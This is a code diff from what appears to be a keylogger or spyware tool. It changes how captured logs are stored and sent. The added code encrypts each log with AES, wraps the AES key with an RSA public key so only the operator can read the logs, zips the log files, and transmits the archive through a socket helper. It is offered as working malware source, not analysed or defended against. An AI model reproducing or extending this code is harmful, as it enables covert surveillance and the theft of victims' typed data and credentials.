@@ -1,10 +1,11 @@
-from pynput import keyboard
-from Crypto.Cipher import AES
+from Crypto.Cipher import AES, PKCS1_OAEP
+from Crypto.PublicKey import RSA
 from Crypto.Random import get_random_bytes
 from Crypto.Util.Padding import pad
 from sys import argv
 import pygetwindow as gw
-import datetime, random
+import utils.socket as s
+import datetime, random, zipfile, glob
 
 def currentTime(format=None):
     time = datetime.datetime.now()
@@ -46,31 +47,52 @@ def checkFlag(timeArr):
 
     return currentMins >= futureMins
 
-def genStr(len):
-    dict = 'abcdefghijklmnopqrstuvwxyz1234567890()-_,.'
-    tmp = ''
-    for i in range(int(len)):
-        tmp += random.choice(dict)
-    return tmp + '.cfd'
+def genStr(len, format=None):
+    if format is None:
+        dict = 'abcdefghijklmnopqrstuvwxyz1234567890()-_,.'
+        tmp = ''
+        for i in range(int(len)):
+            tmp += random.choice(dict)
+        return 'output/' + tmp + '.cfd'
+    if format == 'alpha':
+        dict = 'abcdefghijklmnopqrstuvwxyz'
+        tmp = ''
+        for i in range(int(len)):
+            tmp += random.choice(dict)
+        return tmp
 
 def save(data):
     dt = currentTime('datetime')
     title = genStr(16)
-    imprinted = dt + '\n' + data
+    imprinted = '!!! BEGINNING OF FILE !!!\n' + dt + '\n\n' + data + '\n\n!!! END OF FILE !!!'
     encoded,key,iv = encryptAES(imprinted.encode())
+    
+    encodedKey = encryptRSA(key)
 
     with open(title, 'wb') as f:
         f.write(iv)
-        f.write(key)
+        f.write(encodedKey)
         f.write(encoded)
     f.close()
+    
+def zipFiles():
+    n = genStr(8,'alpha')
+    files = glob.glob('output/*.cfd')
+    with zipfile.ZipFile(n + '.zip','w') as zipf:
+        for file in files:
+            zipf.write(file)
+    zipf.close()
+    
+    s.send(n + '.zip')
 
 def readLog():
     with open(argv[1],'rb') as f:
         iv = f.read(16)
-        key = f.read(16)
+        key = f.read(256)
         ciphertext = f.read()
-    print(decryptAES(ciphertext,key,iv))
+    f.close()
+    decryptedKey = decryptRSA(key)
+    print(decryptAES(ciphertext,decryptedKey,iv))
 
 def encryptAES(data):
     padded = pad(data,16)
@@ -84,3 +106,15 @@ def decryptAES(data,key,iv):
     cipher = AES.new(key, AES.MODE_CBC, iv)
     message = cipher.decrypt(data)
     return message.decode()
+    
+def encryptRSA(data):
+    key = RSA.import_key(open('keys/pub.pem').read())
+    cipherRSA = PKCS1_OAEP.new(key)
+    encrypted = cipherRSA.encrypt(data)
+    return encrypted
+    
+def decryptRSA(data):
+    key = RSA.import_key(open('keys/priv.pem').read())
+    cipherRSA = PKCS1_OAEP.new(key)
+    decrypted = cipherRSA.decrypt(data)
+    return decrypted
